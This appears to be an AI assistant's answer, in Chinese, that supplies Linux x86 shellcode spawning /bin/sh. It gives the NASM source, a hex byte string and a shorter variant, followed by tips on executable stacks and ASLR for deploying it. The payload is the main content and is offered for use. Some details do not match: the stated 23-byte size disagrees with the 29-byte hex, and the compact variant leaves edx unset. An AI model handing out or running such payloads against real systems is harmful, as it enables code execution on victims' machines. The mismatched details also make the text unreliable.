下面是一个Linux x86 (32位)下执行`/bin/sh`的shellcode：

```nasm
; Linux x86 execve("/bin/sh") shellcode
; 大小：23 bytes

global _start
section .text
_start:
    ; 清零寄存器
    xor eax, eax        ; EAX = 0
    xor ebx, ebx        ; EBX = 0
    xor ecx, ecx        ; ECX = 0
    xor edx, edx        ; EDX = 0
    
    ; 构建"/bin/sh"字符串
    push eax            ; 字符串结束符NULL
    push 0x68732f6e     ; "hs/n"
    push 0x69622f2f     ; "ib//"
    
    ; 设置参数
    mov ebx, esp        ; EBX = 指向"/bin/sh"
    push eax            ; NULL终止符
    push ebx            ; 参数字符串地址
    mov ecx, esp        ; ECX = argv
    
    ; 执行syscall
    mov al, 0xb         ; execve的系统调用号是11 (0xb)
    int 0x80           ; 触发系统调用
```

十六进制形式：
```
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

主要特点和解析：

1. 系统调用约定(x86):
- eax: 系统调用号
- ebx: 第一个参数
- ecx: 第二个参数
- edx: 第三个参数
- int 0x80触发系统调用

2. 内存布局：
```
[null]
[/bin/sh\0]
[ptr -> "/bin/sh"]
[null]
```

3. execve参数：
- path = "/bin/sh"
- argv = ["/bin/sh", NULL]
- envp = NULL

4. 与AMD64版本的主要区别：
- 使用32位寄存器
- int 0x80代替syscall
- 系统调用号不同(11 vs 59)
- 参数传递方式不同

注意事项：
1. 避免NULL字节
2. 栈对齐要求
3. 寄存器使用规范
4. 系统调用号差异

另一个更紧凑的变体：
```nasm
; 更短的版本
push 0xb
pop eax
xor ecx, ecx
push ecx
push 0x68732f2f   ; "hs//"
push 0x6e69622f   ; "nib/"
mov ebx, esp      ; ebx = "/bin/sh"
push ecx
push ebx
mov ecx, esp      ; ecx = argv
int 0x80
```

使用建议：
1. 测试环境兼容性
2. 检查安全限制
3. 确保栈可执行
4. 考虑ASLR影响

这个shellcode相比64位版本：
- 代码更简短
- 参数传递更简单
- 系统调用方式不同
- 整体结构相似